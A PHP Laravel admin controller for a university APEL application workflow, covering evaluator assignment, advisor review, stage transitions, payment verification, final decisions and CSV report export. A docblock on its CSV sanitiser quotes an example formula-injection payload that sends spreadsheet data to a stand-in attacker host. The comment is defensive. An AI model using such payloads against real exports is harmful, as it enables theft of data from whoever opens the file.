<?php

namespace App\Http\Controllers\Admin;

use App\Domain\Apel\ApelStage;
use App\Domain\Apel\IllegalStageTransition;
use App\Domain\Apel\StageMachine;
use App\Http\Controllers\Controller;
use App\Mail\GenericQueueMail;
use App\Models\ActivityLog;
use App\Models\Application;
use App\Models\AssessmentSubmission;
use App\Models\User;
use App\Services\ApelDecisionSupportService;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Mail;
use Illuminate\Validation\Rule;

class ApplicationManagementController extends Controller
{
    public function __construct(private ApelDecisionSupportService $decisionSupport) {}

    public function index()
    {
        $all = Application::where('stage', '!=', ApelStage::DRAFT->value)->get();

        $apelA = $all->where('application_type', 'APEL A')
            ->sortByDesc(function ($app) {
                return $app->target_year ?? date('Y', strtotime($app->submission_date));
            });

        $apelC = $all->where('application_type', 'APEL C')
            ->sortByDesc(function ($app) {
                return $app->target_year ?? date('Y', strtotime($app->submission_date));
            });

        $applications = $apelA->merge($apelC);

        return view('admin.applications.index', compact('applications'));
    }

    public function assignForm($id)
    {
        $application = Application::where('_id', $id)->firstOrFail();

        if ($application->application_type === 'APEL C') {
            if (empty($application->credit_course_code) || empty($application->credit_course_name)) {
                if (preg_match('/^(.*?)\s*\(([^)]+)\)$/', $application->program_applied, $matches)) {
                    $application->credit_course_name = trim($matches[1]);
                    $application->credit_course_code = trim($matches[2]);
                    $application->save();
                }
            }
        }

        $evaluators = User::where('role', 'evaluator')->get();
        $apelAEligibility = $this->decisionSupport->evaluateApelA($application);
        $evaluatorBrief = $this->decisionSupport->generateEvaluatorBrief($application);
        $evaluatorRecommendations = $this->decisionSupport->rankEvaluators();

        return view('admin.applications.assign', compact(
            'application',
            'evaluators',
            'apelAEligibility',
            'evaluatorBrief',
            'evaluatorRecommendations'
        ));
    }

    public function evaluatorBrief($id)
    {
        $application = Application::where('_id', $id)->firstOrFail();

        if ($application->application_type !== 'APEL A') {
            return redirect()->route('admin.applications.assign.form', $application->_id)
                ->withErrors([
                    'brief' => 'The evaluator brief is currently available for APEL A applications only.',
                ]);
        }

        $student = User::where('_id', (string) $application->user_id)->first();
        $brief = $this->decisionSupport->generateEvaluatorBrief($application);

        return view('admin.applications.brief', compact('application', 'student', 'brief'));
    }

    public function assignEvaluator(Request $request, $id)
    {
        $application = Application::where('_id', $id)->firstOrFail();
        $isApelC = $application->application_type === 'APEL C';

        $rules = [
            'evaluator_id' => 'required|string',
            'evaluator_2_id' => 'nullable|string|different:evaluator_id',
        ];

        if ($isApelC) {
            $rules['assessment_type'] = 'required|in:portfolio,test';
        }

        $request->validate($rules);

        /*
         | The precondition is now the stage itself rather than a separate
         | payment_status field that could disagree with it. This also blocks
         | the case the old check missed entirely: reassigning an application
         | that has already been decided.
         */
        if (! StageMachine::can($application, ApelStage::EVALUATOR_ASSIGNED)) {
            return redirect()->back()->withErrors([
                'evaluator_id' => $application->stage() === ApelStage::PAYMENT_VERIFIED
                    ? 'This application cannot be assigned at its current stage.'
                    : 'Payment must be verified before an evaluator can be assigned. This application is at "'.$application->stageLabel().'".',
            ]);
        }

        $evaluator = User::where('_id', $request->evaluator_id)
            ->where('role', 'evaluator')
            ->first();

        if (! $evaluator) {
            return back()->withErrors([
                'evaluator_id' => 'Selected evaluator is invalid.',
            ]);
        }

        $evaluator2 = null;
        if ($request->filled('evaluator_2_id')) {
            $evaluator2 = User::where('_id', $request->evaluator_2_id)
                ->where('role', 'evaluator')
                ->first();

            if (! $evaluator2) {
                return back()->withErrors([
                    'evaluator_2_id' => 'Selected second evaluator is invalid.',
                ]);
            }
        }

        $updateData = [
            'evaluator_id' => (string) $evaluator->_id,
            'evaluator_2_id' => $evaluator2 ? (string) $evaluator2->_id : null,
            'assigned_at' => now(),
        ];

        if ($isApelC) {
            $updateData['assessment_type'] = $request->assessment_type;
        }

        $application = StageMachine::transition(
            $application,
            ApelStage::EVALUATOR_ASSIGNED,
            $updateData,
            $evaluator2
                ? "Assigned to {$evaluator->name} and {$evaluator2->name}."
                : "Assigned to {$evaluator->name}.",
        );

        /*
         | Portfolio mode needs nothing further from the evaluator, so the
         | candidate can begin at once.
         |
         | The old code instead created an AssessmentSubmission here with
         | status 'submitted' and submitted_at = now() — before the candidate
         | had written a word. That put an empty portfolio into the evaluator's
         | grading queue as though it were finished work, and it is why an
         | application could be graded against nothing at all.
         */
        if ($isApelC && $request->assessment_type === 'portfolio') {
            $application = StageMachine::transition(
                $application,
                ApelStage::ASSESSMENT_SET,
                [],
                'Portfolio assessment opened for the candidate.',
            );
        }

        if ($isApelC && $request->assessment_type === 'test') {
            AssessmentSubmission::where('application_id', (string) $application->_id)
                ->whereNull('answer_file')
                ->delete();
        }

        $studentName = User::where('_id', $application->user_id)->value('name') ?? 'Student';
        $evalNames = $evaluator2 ? "{$evaluator->name} & {$evaluator2->name}" : $evaluator->name;

        ActivityLog::create([
            'user_id' => (string) Auth::id(),
            'user_name' => Auth::user()->name,
            'user_role' => Auth::user()->role,
            'action' => 'Assigned Evaluator',
            'description' => "Assigned evaluator(s) {$evalNames} to {$application->application_type} application for '{$application->program_applied}' (Student: {$studentName})",
            'ip_address' => $request->ip(),
        ]);

        $application = Application::where('_id', $id)->firstOrFail();

        $this->sendMail(
            $application->user_id,
            'UTM APEL Evaluator Assigned',
            "An evaluator has been assigned to your application.\n\n".
                "Application: {$application->application_type}\n".
                "Programme / Course: {$application->program_applied}\n".
                "Evaluator(s): {$evalNames}\n".
                'Status: Evaluator Assigned'
        );

        $this->sendMail(
            $evaluator->_id,
            'New UTM APEL Application Assigned',
            "You have been assigned to review an APEL application.\n\n".
                "Application: {$application->application_type}\n".
                "Programme / Course: {$application->program_applied}\n".
                'Status: Evaluator Assigned'
        );

        if ($evaluator2) {
            $this->sendMail(
                $evaluator2->_id,
                'New UTM APEL Application Assigned',
                "You have been assigned to review an APEL application.\n\n".
                    "Application: {$application->application_type}\n".
                    "Programme / Course: {$application->program_applied}\n".
                    'Status: Evaluator Assigned'
            );
        }

        return redirect()->route('admin.applications.index')
            ->with('success', 'Evaluator assigned successfully.');
    }

    public function advisorApprove(Request $request, $id)
    {
        $application = Application::where('_id', $id)->firstOrFail();

        $request->validate([
            'advisor_name' => 'required|string|max:255',
            'advisor_evaluation' => 'required|array',
            'recommendation_status' => 'required|in:Recommended,NOT recommended',
            'mode_of_assessment' => 'required|in:portfolio,test',
            'advisor_remarks' => 'nullable|string|max:1000',
        ]);

        $recommended = $request->recommendation_status === 'Recommended';
        $target = $recommended ? ApelStage::ADVISOR_APPROVED : ApelStage::ADVISOR_REJECTED;

        /*
         | Neither guard existed. The Blade template hid this form for anything
         | that was not an APEL C pre-application, but the route itself accepted
         | any application id — so an APEL A case could be "advisor approved",
         | and an already-decided one could be re-decided, overwriting its stage.
         */
        if (! $application->isApelC()) {
            return redirect()->route('admin.applications.index')->withErrors([
                'advisor_name' => 'Advisor review applies to APEL C pre-applications only.',
            ]);
        }

        if (! StageMachine::can($application, $target)) {
            return redirect()->back()->withErrors([
                'advisor_name' => 'This pre-application is at "'.$application->stageLabel().'" and is no longer awaiting an advisor recommendation.',
            ]);
        }

        $application = StageMachine::transition($application, $target, [
            'advisor_name' => $request->advisor_name,
            'advisor_approved_at' => now(),
            'mode_of_assessment' => $request->mode_of_assessment,
            'advisor_evaluation' => [
                'clo_scores' => $request->advisor_evaluation,
                'recommendation' => $request->recommendation_status,
                'remarks' => $request->advisor_remarks,
            ],
        ], "Advisor {$request->advisor_name} recorded: {$request->recommendation_status}.");

        // A recommendation is what makes the fee payable. Until now
        // payment_status was 'pending' from the moment the record was created,
        // so candidates were chased for money before anyone had read their
        // pre-application — and were still chased after being turned down.
        if ($recommended) {
            $application = StageMachine::transition(
                $application,
                ApelStage::PAYMENT_DUE,
                [],
                'Processing fee opened following the advisor recommendation.',
            );
        }

        $studentName = $application->pre_app_data['personal_particulars']['name'] ?? 'Student';
        ActivityLog::create([
            'user_id' => (string) Auth::id(),
            'user_name' => Auth::user()->name,
            'user_role' => Auth::user()->role,
            'action' => 'Advisor Evaluated',
            'description' => "Advisor '{$request->advisor_name}' reviewed pre-application for student '{$studentName}' and marked as '{$request->recommendation_status}' (Assessment Mode: ".ucfirst($request->mode_of_assessment).')',
            'ip_address' => $request->ip(),
        ]);

        $this->sendMail(
            $application->user_id,
            'UTM APEL C Pre-Application Decision',
            "Your pre-application has been reviewed by Advisor {$request->advisor_name}.\n\n".
                "Reference: {$application->reference()}\n".
                "Decision: {$request->recommendation_status}\n".
                'Assessment mode: '.ucfirst($request->mode_of_assessment)."\n\n".
                $application->stageExplanation()."\n\n".
                "Thank you.\nFaculty of Computing, UTM"
        );

        return redirect()->route('admin.applications.index')
            ->with('success', 'Advisor review submitted successfully.');
    }

    /**
     * Move an application to another stage by hand.
     *
     * This used to validate 'status' => 'required|string' — literally any text
     * was written straight onto the record, so a typo produced a status no view
     * could interpret and no code could act on. Passing 'Assessment In
     * Progress' additionally deleted both evaluators' decisions and every grade,
     * with no confirmation and no way back.
     *
     * A manual move is now restricted to the stages the process actually allows
     * from where the application currently stands, and reopening a decided case
     * is a named action with its own reason, not a side effect of a status
     * change.
     */
    public function updateStatus(Request $request, $id)
    {
        $application = Application::where('_id', $id)->firstOrFail();

        $request->validate([
            'stage' => ['required', 'string', Rule::in(
                array_map(fn (ApelStage $stage) => $stage->value, StageMachine::nextStages($application))
            )],
            'reason' => 'required|string|max:500',
        ], [
            'stage.in' => 'That is not a move this application can make from "'.$application->stageLabel().'".',
            'reason.required' => 'Record why you are moving this application by hand — it becomes part of the audit trail.',
        ]);

        $target = ApelStage::from($request->stage);
        $reopening = in_array($target, [ApelStage::UNDER_REVIEW, ApelStage::ASSESSMENT_SET], true)
            && $application->stage() === ApelStage::AWAITING_DECISION;

        $attributes = [];

        if ($reopening) {
            $attributes = $this->clearedDecisionFields($application);

            AssessmentSubmission::where('application_id', (string) $application->_id)->update([
                'evaluator_1_score' => null,
                'evaluator_1_result' => null,
                'evaluator_1_feedback' => null,
                'evaluator_1_graded_at' => null,
                'evaluator_2_score' => null,
                'evaluator_2_result' => null,
                'evaluator_2_feedback' => null,
                'evaluator_2_graded_at' => null,
                'score' => null,
                'result' => null,
                'grader_feedback' => null,
                'graded_by' => null,
                'graded_at' => null,
                'status' => 'submitted',
            ]);
        }

        try {
            $application = StageMachine::transition($application, $target, $attributes, $request->reason);
        } catch (IllegalStageTransition $e) {
            return redirect()->back()->withErrors(['stage' => $e->forHumans()]);
        }

        $studentName = User::where('_id', $application->user_id)->value('name') ?? 'Student';

        ActivityLog::create([
            'user_id' => (string) Auth::id(),
            'user_name' => Auth::user()->name,
            'user_role' => Auth::user()->role,
            'action' => $reopening ? 'Reopened Assessment' : 'Moved Stage',
            'description' => ($reopening ? 'Reopened' : 'Moved')
                ." {$application->application_type} application for '{$application->program_applied}' to '{$application->stageLabel()}' (Student: {$studentName}). Reason: {$request->reason}",
            'ip_address' => $request->ip(),
        ]);

        $this->sendMail(
            $application->user_id,
            'UTM APEL Application Update',
            "There has been an update to your application.\n\n".
                "Reference: {$application->reference()}\n".
                "Programme / Course: {$application->program_applied}\n".
                "Stage: {$application->stageLabel()}\n\n".
                $application->stageExplanation()
        );

        return redirect()->back()
            ->with('success', 'Application moved to "'.$application->stageLabel().'".');
    }

    /** The decision fields a reopening clears, by application type. */
    private function clearedDecisionFields(Application $application): array
    {
        if ($application->isApelC()) {
            return [
                'credit_decision' => null,
                'credit_remarks' => null,
                'credit_hours_approved' => null,
                'reviewed_at' => null,
            ];
        }

        return [
            'final_decision' => null,
            'final_decision_remarks' => null,
            'admission_decision' => null,
            'panel_split' => false,
            'evaluator_1_decision' => null,
            'evaluator_1_feedback' => null,
            'evaluator_1_reviewed_at' => null,
            'evaluator_2_decision' => null,
            'evaluator_2_feedback' => null,
            'evaluator_2_reviewed_at' => null,
            'reviewed_at' => null,
        ];
    }

    public function finalizeApelA(Request $request, $id)
    {
        $application = Application::where('_id', $id)->firstOrFail();

        if ($application->application_type !== 'APEL A') {
            return redirect()->route('admin.applications.index')
                ->with('success', 'This action is only available for APEL A applications.');
        }

        if (in_array($application->final_decision ?? '', ['approved', 'rejected'])) {
            return redirect()->back()->withErrors([
                'final_decision' => 'The final decision has already been saved and cannot be updated.',
            ]);
        }

        $isSingleEvaluator = empty($application->evaluator_2_id);
        $bothReviewed = ! empty($application->evaluator_1_reviewed_at) && ! empty($application->evaluator_2_reviewed_at);
        $canFinalize = $isSingleEvaluator ? ! empty($application->evaluator_1_reviewed_at) : $bothReviewed;

        if (! $canFinalize) {
            return redirect()->back()->withErrors([
                'final_decision' => $isSingleEvaluator
                    ? 'Final decision cannot be made before the evaluator has submitted their review.'
                    : 'Final decision cannot be made before both evaluators have submitted their reviews.',
            ]);
        }

        $request->validate([
            'final_decision' => 'required|in:approved,rejected',
            'final_decision_remarks' => 'nullable|string|max:1000',
        ]);

        $finalDecision = $request->final_decision;

        $application = StageMachine::transition(
            $application,
            $finalDecision === 'approved' ? ApelStage::APPROVED : ApelStage::REJECTED,
            [
                'final_decision' => $finalDecision,
                'final_decision_remarks' => $request->final_decision_remarks,
                'finalized_at' => now(),
            ],
            'Final decision: '.ucfirst($finalDecision).'.',
        );

        $studentName = User::where('_id', $application->user_id)->value('name') ?? 'Student';
        ActivityLog::create([
            'user_id' => (string) Auth::id(),
            'user_name' => Auth::user()->name,
            'user_role' => Auth::user()->role,
            'action' => 'Finalized APEL A',
            'description' => "Completed final decision as '".ucfirst($finalDecision)."' for APEL A application '{$application->program_applied}' (Student: {$studentName})",
            'ip_address' => $request->ip(),
        ]);

        $application = Application::where('_id', $id)->firstOrFail();

        $this->sendMail(
            $application->user_id,
            'UTM APEL A Final Decision',
            "Your APEL A final decision has been updated.\n\n".
                "Programme: {$application->program_applied}\n".
                'Final Decision: '.ucfirst($application->final_decision ?? 'pending')."\n".
                "Status: {$application->status}\n\n".
                'Remarks: '.($application->final_decision_remarks ?? 'No remarks provided.')
        );

        return redirect()->route('admin.applications.assign.form', $application->_id)
            ->with('success', 'Final APEL A decision updated successfully.');
    }

    public function apelAIndex()
    {
        $applications = Application::where('application_type', 'APEL A')
            ->orderBy('submission_date', 'desc')
            ->get();

        return view('admin.apel_a.index', compact('applications'));
    }

    public function finalizeApelC(Request $request, $id)
    {
        $application = Application::where('_id', $id)->firstOrFail();

        if ($application->application_type !== 'APEL C') {
            return redirect()->route('admin.applications.index')
                ->withErrors([
                    'credit_decision' => 'This action is only available for APEL C applications.',
                ]);
        }

        if (in_array($application->credit_decision ?? '', ['approved', 'rejected'])) {
            return redirect()->back()->withErrors([
                'credit_decision' => 'The final credit decision has already been saved and cannot be updated.',
            ]);
        }

        $gradedSubmission = AssessmentSubmission::where('application_id', (string) $application->_id)
            ->whereNotNull('graded_at')
            ->first();

        if (! $gradedSubmission) {
            return redirect()->back()->withErrors([
                'credit_decision' => 'Final credit decision cannot be made before grading is completed.',
            ])->withInput();
        }

        $request->validate([
            'credit_decision' => 'required|in:approved,rejected',
            'credit_remarks' => 'nullable|string|max:1000',
            'credit_course_code' => 'nullable|string|max:100',
            'credit_course_name' => 'nullable|string|max:255',
        ]);

        $decision = $request->credit_decision;

        $submission = AssessmentSubmission::where('application_id', (string) $application->_id)->first();
        if ($submission && $submission->result === 'fail' && $decision === 'approved') {
            return redirect()->back()->with('error', 'Cannot approve credit decision when the grading outcome is fail/rejected.');
        }

        $approvedHours = 0;
        if ($decision === 'approved') {
            $approvedHours = self::getCreditHoursFromCourseCode($application->credit_course_code);
        }

        $application = StageMachine::transition(
            $application,
            $decision === 'approved' ? ApelStage::APPROVED : ApelStage::REJECTED,
            [
                'credit_decision' => $decision,
                'credit_remarks' => $request->credit_remarks,
                'credit_hours_approved' => $approvedHours,

                /*
                 | Only overwrite the course when a replacement was actually
                 | supplied. Both fields are nullable in the rules, so when the
                 | form omitted them this wrote null over the course the credit
                 | was being awarded for — while $approvedHours had already been
                 | computed from the old value, leaving hours and course
                 | contradicting each other on the finished record.
                 */
                'credit_course_code' => $request->credit_course_code ?: $application->credit_course_code,
                'credit_course_name' => $request->credit_course_name ?: $application->credit_course_name,

                'credit_decided_at' => now(),
                'reviewed_at' => $application->reviewed_at ?? now(),
            ],
            'Credit decision: '.ucfirst($decision).($decision === 'approved' ? " ({$approvedHours} credit hours)." : '.'),
        );

        $studentName = User::where('_id', $application->user_id)->value('name') ?? 'Student';
        ActivityLog::create([
            'user_id' => (string) Auth::id(),
            'user_name' => Auth::user()->name,
            'user_role' => Auth::user()->role,
            'action' => 'Finalized APEL C',

            /*
             | This read $request->credit_hours_approved, which is not a field
             | on this form and never has been — so every credit award in the
             | audit trail was recorded as "0 approved hours" regardless of what
             | was actually granted. The value is computed from the course code.
             */
            'description' => "Completed credit transfer decision as '".ucfirst($decision)."' with {$approvedHours} approved hours for course '{$application->program_applied}' (Student: {$studentName})",
            'ip_address' => $request->ip(),
        ]);

        $application = Application::where('_id', $id)->firstOrFail();

        $this->sendMail(
            $application->user_id,
            'UTM APEL C Final Credit Decision',
            "Your APEL C final credit decision has been updated.\n\n".
                "Course: {$application->program_applied}\n".
                'Credit Decision: '.ucfirst($application->credit_decision ?? 'pending')."\n".
                'Approved Credit Hours: '.($application->credit_hours_approved ?? 'Not decided')."\n".
                "Status: {$application->status}\n\n".
                'Remarks: '.($application->credit_remarks ?? 'No remarks provided.')
        );

        return redirect()->route('admin.applications.assign.form', $application->_id)
            ->with('success', 'Final APEL C credit decision updated successfully.');
    }

    public function updatePayment(Request $request, $id)
    {
        $request->validate([
            'payment_status' => 'required|in:verified,rejected',
            'payment_reference' => 'required_if:payment_status,verified|nullable|string|max:255',
            'payment_remarks' => 'required_if:payment_status,rejected|nullable|string|max:1000',
        ], [
            'payment_reference.required_if' => 'Record the faculty receipt reference you verified this against.',
            'payment_remarks.required_if' => 'Tell the candidate why the receipt was not accepted, so they can correct it.',
        ]);

        $application = Application::where('_id', $id)->firstOrFail();

        $verifying = $request->payment_status === 'verified';
        $target = $verifying ? ApelStage::PAYMENT_VERIFIED : ApelStage::PAYMENT_REJECTED;

        /*
         | This method used to write `status` unconditionally from the payment
         | outcome. Because it could be called at any time, verifying a late or
         | corrected receipt threw away whatever the application had actually
         | reached — an application in "Assessment In Progress" would silently
         | become "Payment Verified" and the evaluator's work would vanish from
         | every queue that filtered on status.
         |
         | Payment is now a stage like any other, and the machine only allows it
         | while the application is genuinely at the payment step.
         */
        if (! StageMachine::can($application, $target)) {
            return redirect()->back()->withErrors([
                'payment_status' => $application->stage() === ApelStage::PAYMENT_VERIFIED
                    ? 'This payment has already been verified.'
                    : 'This application is at "'.$application->stageLabel().'", so there is no payment awaiting verification.',
            ]);
        }

        $application = StageMachine::transition($application, $target, [
            'payment_reference' => $request->payment_reference ?: $application->payment_reference,
            'payment_remarks' => $request->payment_remarks,
            'payment_verified_at' => $verifying ? now() : null,
        ], $verifying
            ? "Receipt verified against reference {$request->payment_reference}."
            : 'Receipt not accepted.');

        $paymentStatus = $request->payment_status;

        $studentName = User::where('_id', $application->user_id)->value('name') ?? 'Student';
        ActivityLog::create([
            'user_id' => (string) Auth::id(),
            'user_name' => Auth::user()->name,
            'user_role' => Auth::user()->role,
            'action' => 'Verified Payment',
            'description' => "Updated payment verification status to '".ucfirst($paymentStatus)."' for {$application->application_type} application '{$application->program_applied}' (Student: {$studentName})",
            'ip_address' => $request->ip(),
        ]);

        $application = Application::where('_id', $id)->firstOrFail();

        $this->sendMail(
            $application->user_id,
            'UTM APEL Payment Status Update',
            "Your payment status has been updated.\n\n".
                "Application: {$application->application_type}\n".
                "Programme / Course: {$application->program_applied}\n".
                'Payment Status: '.ucfirst($application->payment_status ?? 'pending')."\n".
                "Current Status: {$application->status}\n\n".
                'Remarks: '.($application->payment_remarks ?? 'No remarks provided.')
        );

        return redirect()->back()
            ->with('success', 'Payment status updated successfully.');
    }

    public function printApelAReport()
    {
        $applications = Application::where('application_type', 'APEL A')
            ->orderBy('submission_date', 'desc')
            ->get();

        $total = $applications->count();
        $approved = $applications->where('status', 'Final Approved')->count();
        $rejected = $applications->where('status', 'Final Rejected')->count();
        $pending = $total - $approved - $rejected;

        return view('admin.reports.apel_a', compact('applications', 'total', 'approved', 'rejected', 'pending'));
    }

    public function printApelCReport()
    {
        $applications = Application::where('application_type', 'APEL C')
            ->orderBy('submission_date', 'desc')
            ->get();

        $total = $applications->count();
        $approved = $applications->where('status', 'Final Approved')->count();
        $rejected = $applications->where('status', 'Final Rejected')->count();
        $pending = $total - $approved - $rejected;

        return view('admin.reports.apel_c', compact('applications', 'total', 'approved', 'rejected', 'pending'));
    }

    /**
     * Neutralise spreadsheet formula injection in exported CSV cells.
     *
     * fputcsv escapes CSV delimiters but not formulas. Student name is
     * user-supplied at registration and program_applied derives from student
     * input, so a value beginning with = + - @ (or a leading tab/CR, which Excel
     * strips before parsing) is evaluated when an administrator opens the
     * downloaded report. That turns a student-controlled string into code
     * execution in the admin's spreadsheet - for example
     * =HYPERLINK("https://evil.tld/?d="&A1,"Click") exfiltrating the sheet.
     *
     * Prefixing with a single quote makes the cell a literal string in Excel,
     * LibreOffice and Google Sheets.
     */
    private static function csvSafe($value): string
    {
        $value = (string) $value;

        if ($value !== '' && str_contains('=+-@	', $value[0])) {
            return "'".$value;
        }

        return $value;
    }

    public static function getCreditHoursFromCourseCode($code)
    {
        $code = trim($code);
        if (empty($code)) {
            return config('apel.default_credit_hours', 3);
        }
        $lastChar = substr($code, -1);
        if (is_numeric($lastChar)) {
            return (int) $lastChar;
        }

        return config('apel.default_credit_hours', 3);
    }

    private function sendMail($userId, $subject, $body)
    {
        $user = User::where('_id', (string) $userId)->first();

        if (! $user || ! $user->email) {
            return;
        }

        try {
            Mail::to($user->email)->queue(new GenericQueueMail($subject, $body));
        } catch (\Exception $e) {
            Log::error('Admin mail error: '.$e->getMessage());
        }
    }

    public function exportApelAReport()
    {
        $applications = Application::where('application_type', 'APEL A')
            ->orderBy('submission_date', 'desc')
            ->get();

        $headers = [
            'Content-Type' => 'text/csv',
            'Content-Disposition' => 'attachment; filename="apel_a_report_'.date('Y-m-d').'.csv"',
        ];

        $callback = function () use ($applications) {
            $file = fopen('php://output', 'w');
            fputcsv($file, ['Submission Date', 'Student Name', 'Programme Applied', 'Admission Decision', 'Status']);

            foreach ($applications as $app) {
                $studentName = User::where('_id', $app->user_id)->value('name') ?? 'N/A';
                fputcsv($file, [
                    self::csvSafe($app->submission_date),
                    self::csvSafe($studentName),
                    self::csvSafe($app->program_applied),
                    self::csvSafe(ucfirst($app->admission_decision ?? 'pending')),
                    self::csvSafe($app->status),
                ]);
            }

            fclose($file);
        };

        return response()->stream($callback, 200, $headers);
    }

    public function exportApelCReport()
    {
        $applications = Application::where('application_type', 'APEL C')
            ->orderBy('submission_date', 'desc')
            ->get();

        $headers = [
            'Content-Type' => 'text/csv',
            'Content-Disposition' => 'attachment; filename="apel_c_report_'.date('Y-m-d').'.csv"',
        ];

        $callback = function () use ($applications) {
            $file = fopen('php://output', 'w');
            fputcsv($file, ['Submission Date', 'Student Name', 'Course Name', 'Course Code', 'Approved Hours', 'Credit Decision', 'Status']);

            foreach ($applications as $app) {
                $studentName = User::where('_id', $app->user_id)->value('name') ?? 'N/A';
                fputcsv($file, [
                    self::csvSafe($app->submission_date),
                    self::csvSafe($studentName),
                    self::csvSafe($app->credit_course_name ?? 'N/A'),
                    self::csvSafe($app->credit_course_code ?? 'N/A'),
                    self::csvSafe($app->credit_hours_approved ?? 0),
                    self::csvSafe(ucfirst($app->credit_decision ?? 'pending')),
                    self::csvSafe($app->status),
                ]);
            }

            fclose($file);
        };

        return response()->stream($callback, 200, $headers);
    }
}
